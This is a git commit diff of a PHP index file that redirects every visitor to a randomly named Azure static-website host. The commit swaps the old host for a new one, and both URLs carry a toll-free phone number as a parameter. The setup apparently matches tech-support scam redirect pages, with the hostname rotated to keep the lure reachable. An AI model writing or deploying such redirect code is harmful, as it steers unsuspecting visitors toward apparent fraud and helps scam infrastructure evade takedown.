b6cf3764508c46d3bfddb2d115ce84c2d5952c7b
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-06-04 21:52:45 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location: https://royalschat6dw8hdw93h8efu.z31.web.core.windows.net/index.html?Aniph=1-833-443-3001");
+header("Location: https://happy2be8shape9inxxxx.z12.web.core.windows.net/index.html?Aniph=1-833-443-3001");
 
 exit;
 ?>
